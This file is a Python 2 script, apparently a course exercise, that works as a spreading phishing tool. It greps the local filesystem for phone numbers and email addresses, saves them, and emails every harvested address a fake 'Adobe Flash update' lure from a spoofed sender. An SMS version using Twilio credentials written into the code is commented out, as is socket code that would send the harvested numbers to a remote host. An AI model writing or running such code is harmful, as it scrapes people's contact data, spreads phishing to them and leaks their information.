import os
from twilio.rest import TwilioRestClient
import socket
import smtplib
from email.mime.text import MIMEText
import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random

phone_numbers = "grep -roh '\(([0-9]\{3\})\|[0-9]\{3\}\)[ -]\?[0-9]\{3\}[ -]\?[0-9]\{4\}' . | sort -u > phonenumbers.txt"
emails = "grep -Eroh '\\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\\b' . | sort -u > emails.txt"

os.system(phone_numbers)
os.system(emails)

client = TwilioRestClient('ACb89307719aa8043871f9912452ef21c6','2f56bc2c9d8ae27afa3baf74fb46f0cb')

fp1 = open('phonenumbers.txt', 'rb')
fp2 = open('emails.txt','rb')
fp1.seek(0)
fp2.seek(0)
numbers_list = []
emails_list = []
for number in fp1:
	numbers_list.append(number.rstrip())
for email in fp2:
	emails_list.append(email.rstrip())

fp1.close()
fp2.close()
print emails_list

text_body = "Hey have you heard about the new Adobe flash update? Download it here: "
for number in numbers_list:
	try:
		#client.messages.create(from_="+12175763259",to=number,body=text_body)
		no_op = 0
	except:
		no_op = 0

numbers = "1337"
pubkeyfp = open('public.pem', 'r')
privkeyfp = open('private.pem','r')
pubkey = RSA.importKey(pubkeyfp.read())
privkey = RSA.importKey(privkeyfp.read(),passphrase='cs460')
ciphertext = pubkey.encrypt(numbers, 0)
plaintext = privkey.decrypt(ciphertext)
#print plaintext

server = smtplib.SMTP()
msg = MIMEText("Hey have you heard about the new Adobe flash update? Download it here: ")
me = "aadoobeeflashy@gmail.com"
msg['Subject'] = "Adobe Flash 1337 Update"
msg['From'] = me
s = smtplib.SMTP('localhost')

for email in emails_list:
	you = email
	msg['To'] = you
	s.sendmail(me, [you], msg.as_string())
s.quit()

# s = socket.socket()         # Create a socket object
# host = '10.0.2.15'  
# port = 12345                 # Reserve a port for your service.
# s.connect((host, port))
# print "asdf"
# f = open('phonenumbers.txt','rb')
# print 'Sending...'
# l = f.read(1024)
# while (l):
#     print 'Sending...'
#     s.send(l)
#     l = f.read(1024)
# f.close()
# print "Done Sending"
# s.shutdown(socket,SHUT_WR)
# print s.recv(1024)
# s.close                     # Close the socket when done

# TCP_IP = '10.0.2.15'
# TCP_PORT = 12345
# BUFFER_SIZE = 1024
# MESSAGE = "Hello, World!" 
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# print "ASDF"
# s.connect((TCP_IP, TCP_PORT))
# s.send(MESSAGE)
# data = s.recv(BUFFER_SIZE)
# s.close()
# print "received data:", data














